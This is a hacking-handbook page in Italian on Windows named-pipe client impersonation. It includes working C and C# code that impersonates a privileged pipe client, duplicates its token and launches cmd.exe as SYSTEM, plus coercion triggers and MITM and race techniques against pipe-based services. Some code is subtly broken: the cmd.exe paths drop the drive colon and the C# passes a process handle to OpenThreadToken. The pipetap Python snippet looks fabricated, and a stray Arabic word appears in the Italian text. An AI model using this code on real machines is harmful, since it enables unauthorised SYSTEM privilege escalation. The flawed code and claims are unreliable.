# Named Pipe Client Impersonation

{{#include ../../banners/hacktricks-training.md}}

Named Pipe client impersonation è una primitive di local privilege escalation che permette a un thread server di named-pipe di adottare il contesto di sicurezza di un client che si connette ad esso. In pratica, un attacker che può eseguire codice con SeImpersonatePrivilege può costringere un client privilegiato (ad es. un servizio SYSTEM) a connettersi a una pipe controllata dall’attacker, chiamare ImpersonateNamedPipeClient, duplicare il token risultante in un primary token e avviare un processo come il client (spesso NT AUTHORITY\SYSTEM).

Questa pagina si concentra sulla tecnica centrale. Per exploit chain end-to-end che forzano SYSTEM a connettersi alla tua pipe, vedi le pagine della famiglia Potato referenziate sotto.

## TL;DR
- Crea una named pipe: \\.\pipe\<random> e aspetta una connessione.
- Fai in modo che un componente privilegiato si connetta ad essa (spooler/DCOM/EFSRPC/etc.).
- Leggi almeno un messaggio dalla pipe, poi chiama ImpersonateNamedPipeClient.
- Apri il token di impersonation dal thread corrente, DuplicateTokenEx(TokenPrimary) e CreateProcessWithTokenW/CreateProcessAsUser per ottenere un processo SYSTEM.

## Requirements and key APIs
- Privileges tipicamente necessari al processo/thread chiamante:
- SeImpersonatePrivilege per impersonare con successo un client connesso e per usare CreateProcessWithTokenW.
- In alternativa, dopo aver impersonato SYSTEM, puoi usare CreateProcessAsUser, che può richiedere SeAssignPrimaryTokenPrivilege e SeIncreaseQuotaPrivilege (questi sono soddisfatti quando stai impersonando SYSTEM).
- Core APIs used:
- CreateNamedPipe / ConnectNamedPipe
- ReadFile/WriteFile (devi leggere almeno un messaggio prima dell’impersonation)
- ImpersonateNamedPipeClient e RevertToSelf
- OpenThreadToken, DuplicateTokenEx(TokenPrimary)
- CreateProcessWithTokenW o CreateProcessAsUser
- Impersonation level: per eseguire azioni utili localmente, il client deve consentire SecurityImpersonation (default per molti client RPC/named-pipe locali). I client possono abbassarlo con SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION quando aprono la pipe.

## Minimal Win32 workflow (C)
```c
// Minimal skeleton (no error handling hardening for brevity)
#include <windows.h>
#include <stdio.h>

int main(void) {
LPCSTR pipe = "\\\\.\\pipe\\evil";
HANDLE hPipe = CreateNamedPipeA(
pipe,
PIPE_ACCESS_DUPLEX,
PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
1, 0, 0, 0, NULL);

if (hPipe == INVALID_HANDLE_VALUE) return 1;

// Wait for privileged client to connect (see Triggers section)
if (!ConnectNamedPipe(hPipe, NULL)) return 2;

// Read at least one message before impersonation
char buf[4]; DWORD rb = 0; ReadFile(hPipe, buf, sizeof(buf), &rb, NULL);

// Impersonate the last message sender
if (!ImpersonateNamedPipeClient(hPipe)) return 3; // ERROR_CANNOT_IMPERSONATE==1368

// Extract and duplicate the impersonation token into a primary token
HANDLE impTok = NULL, priTok = NULL;
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4;
if (!DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &priTok)) return 5;

// Spawn as the client (often SYSTEM). CreateProcessWithTokenW requires SeImpersonatePrivilege.
STARTUPINFOW si = { .cb = sizeof(si) }; PROCESS_INFORMATION pi = {0};
if (!CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
0, NULL, NULL, &si, &pi)) {
// Fallback: CreateProcessAsUser after you already impersonated SYSTEM
CreateProcessAsUserW(priTok, L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

RevertToSelf(); // Restore original context
return 0;
}
```
Notes:
- Se ImpersonateNamedPipeClient restituisce ERROR_CANNOT_IMPERSONATE (1368), assicurati di leggere dalla pipe prima e che il client non abbia limitato l'impersonation al livello Identification.
- Preferisci DuplicateTokenEx con SecurityImpersonation e TokenPrimary per creare un primary token adatto alla creazione di processi.

## .NET quick example
In .NET, NamedPipeServerStream può fare impersonation tramite RunAsClient. Una volta in impersonation, duplica il thread token e crea un processo.
```csharp
using System; using System.IO.Pipes; using System.Runtime.InteropServices; using System.Diagnostics;
class P {
[DllImport("advapi32", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool o, out IntPtr h);
[DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr sd, int il, int tt, out IntPtr p);
[DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)] static extern bool CreateProcessWithTokenW(IntPtr hTok, int f, string app, string cmd, int c, IntPtr env, string cwd, ref ProcessStartInfo si, out Process pi);
static void Main(){
using var s = new NamedPipeServerStream("evil", PipeDirection.InOut, 1);
s.WaitForConnection();
// Ensure client sent something so the token is available
s.RunAsClient(() => {
IntPtr t; if(!OpenThreadToken(Process.GetCurrentProcess().Handle, 0xF01FF, false, out t)) return; // TOKEN_ALL_ACCESS
IntPtr p; if(!DuplicateTokenEx(t, 0xF01FF, IntPtr.Zero, 2, 1, out p)) return; // SecurityImpersonation, TokenPrimary
var psi = new ProcessStartInfo("C\\Windows\\System32\\cmd.exe");
Process pi; CreateProcessWithTokenW(p, 2, null, null, 0, IntPtr.Zero, null, ref psi, out pi);
});
}
}
```
## Common triggers/coercions to get SYSTEM to your pipe
Queste tecniche costringono servizi privilegiati a connettersi al tuo named pipe, così puoi impersonarli:
- Print Spooler RPC trigger (PrintSpoofer)
- DCOM activation/NTLM reflection variants (RoguePotato/JuicyPotato[NG], GodPotato)
- EFSRPC pipes (EfsPotato/SharpEfsPotato)

Vedi l'uso dettagliato e la compatibilità qui:

-
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}
-
{{#ref}}
juicypotato.md
{{#endref}}

Se ti serve solo un esempio completo di creazione del pipe e impersonation per avviare SYSTEM da un service trigger, vedi:

-
{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}
-
{{#ref}}
service-triggers.md
{{#endref}}

## Named Pipe IPC Abuse & MITM (ACLs, First-Instance Races, Client Hooking)

Quando un servizio privilegiato e un processo a basso privilegio comunicano tramite `\\.\pipe\...`, tratta il pipe come qualsiasi altro confine IPC non affidabile. Oltre alla classica impersonation lato server, ACL deboli del pipe, flag di creazione non sicuri e decisioni di fiducia lato client possono tutti diventare primitive di local privilege escalation.

### Enumera prima i pipe candidati
- Elenca rapidamente i pipe da PowerShell: `Get-ChildItem \\.\pipe\`
- Sysinternals `pipelist64.exe` è utile per individuare il numero di istanze e i pipe a istanza singola.
- Dai priorità ai nomi usati da servizi in esecuzione come `SYSTEM`, soprattutto helper, updater, launcher e UI broker.

### MITM tramite DACL permissive e istanze extra del pipe
- Qualsiasi processo che può comunicare con un server privilegiato può già fuzzare il suo protocollo e cercare verb privilegiati.
- Il caso più interessante è quando la DACL concede `FILE_GENERIC_WRITE`/`GENERIC_WRITE` sull'oggetto pipe. Sui named pipe questo include implicitamente `FILE_CREATE_PIPE_INSTANCE` (`FILE_APPEND_DATA` condivide lo stesso bit), quindi un attaccante può creare un'altra istanza server con lo stesso nome.
- Poiché le istanze vengono abbinate in ordine FIFO, istanze create dall'attaccante e istanze legittime possono essere interleaved: crea una rogue instance con `CreateNamedPipe`, poi apri lo stesso nome del pipe con `CreateFile`, e aspetta che un client reale finisca sulla rogue server instance.
- Risultato: osserva, modifica, relay o desincronizza l'IPC privilegiata senza dover possedere il processo server originale.

### First-instance race sui security descriptor del pipe
- `lpSecurityAttributes` definisce la DACL solo quando viene creata la prima istanza di un nome pipe.
- Se un servizio privilegiato si avvia tardi e non usa `FILE_FLAG_FIRST_PIPE_INSTANCE`, un attaccante può pre-creare il nome del pipe con una DACL permissiva, poi lasciare che il servizio crei istanze successive sotto il security context scelto dall'attaccante.
- Questo trasforma l'avvio del servizio in una race condition: vinci la prima istanza, poi connetti o fai MITM con i client successivi usando la ACL indebolita.
- Mitigazione per i difensori, e punto di controllo chiave per gli attaccanti: verifica se `CreateNamedPipe(..., dwOpenMode, ...)` include `FILE_FLAG_FIRST_PIPE_INSTANCE`. Se no, testa la pre-creazione prima che il servizio parta.

### I controlli PID/signature sono hardening, non un boundary
- Alcuni prodotti cercano di limitare l'accesso controllando `GetNamedPipeClientProcessId`, il percorso dell'immagine del processo o il firmatario Authenticode del client che si connette.
- Questo aiuta solo finché non fai injection nel client legittimo: una volta dentro il processo fidato, erediti il preciso contesto PID/image/signature che il server si aspetta.
- Per app desktop separate, strumentare il processo UI/helper a basso privilegio è spesso più facile che attaccare direttamente il servizio `SYSTEM`.

### Hook il client in base al suo modello di I/O
- I/O sincrono: intercetta `NtWriteFile` prima che la syscall consumi il buffer, e ispeziona/patcha `NtReadFile` dopo che ritorna.
- I/O overlapped: salva l'`OVERLAPPED`/`IoStatusBlock` visto in `NtReadFile`, poi ispeziona il buffer dopo `GetOverlappedResult` o al completamento del wait rilevante.
- Completion ports: `GetQueuedCompletionStatus` arriva a `NtRemoveIoCompletion`; l'`ApcContext` restituito collega di nuovo all'`OVERLAPPED` usato dalla read originale, che è il pivot giusto per trovare il buffer ora popolato.
- Completion routines (`ReadFileEx`): la completion callback viene consegnata come APC. Se vuoi alterare i dati restituiti o iniettare risposte sintetiche, hooka la vera completion routine e, per l'injection custom, usa un dispatcher `QueueUserAPC` a un argomento che ricostruisce i 3 argomenti attesi della routine.

### Note sul tooling
- [pipetap](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/) proxy il traffico named-pipe tramite una DLL helper iniettata e offre un workflow simile a Burp per editing/replay.
- [thats_no_pipe](https://github.com/synacktiv/thats_no_pipe) adotta un approccio basato su Frida e si concentra su hooking `NtReadFile`/`NtWriteFile` più i pivot async/completion sopra, poi inoltra il traffico a un workflow di editing supportato da WebSocket.
```bash
pip install pipetap
```

```python
import pipetap
client = pipetap.Client(("127.0.0.1", 47001))
client.write(b"OP\x00\x01...")
```
### Considerazioni operative
- I named pipes hanno bassa latenza; lunghe pause أثناء la modifica dei buffer possono mandare in deadlock servizi fragili.
- Client basati su overlapped/completion-port/APC richiedono hook diversi rispetto ai semplici detour di `ReadFile`/`WriteFile`.
- L’injection nel client fidato è rumorosa ed è in genere meglio riservarla a exploit development, protocol reversing o local lab fuzzing.

## Troubleshooting e gotchas
- Devi leggere almeno un messaggio dal pipe prima di chiamare ImpersonateNamedPipeClient; altrimenti otterrai ERROR_CANNOT_IMPERSONATE (1368).
- Se il client si connette con SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION, il server non può impersonare completamente; controlla il livello di impersonation del token tramite GetTokenInformation(TokenImpersonationLevel).
- CreateProcessWithTokenW richiede SeImpersonatePrivilege per il chiamante. Se fallisce con ERROR_PRIVILEGE_NOT_HELD (1314), usa CreateProcessAsUser dopo aver già impersonato SYSTEM.
- Assicurati che il security descriptor del tuo pipe consenta al servizio target di connettersi se lo rendi più restrittivo; per default, i pipe sotto \\.\pipe sono accessibili in base alla DACL del server.

## References
- [Windows: ImpersonateNamedPipeClient documentation](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient)
- [ired.team: Windows named pipes privilege escalation](https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation)
- [Microsoft: Named Pipe Security and Access Rights](https://learn.microsoft.com/en-us/windows/win32/ipc/named-pipe-security-and-access-rights)
- [Microsoft: CreateNamedPipe function](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createnamedpipea)
- [Microsoft: Named Pipe Server Using Completion Routines](https://learn.microsoft.com/en-us/windows/win32/ipc/named-pipe-server-using-completion-routines)
- [pipetap – a Windows named pipe proxy tool](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/)
- [Synacktiv: Hooking Windows Named Pipes](https://www.synacktiv.com/en/publications/hooking-windows-named-pipes.html)
- [Synacktiv: thats_no_pipe](https://github.com/synacktiv/thats_no_pipe)

{{#include ../../banners/hacktricks-training.md}}
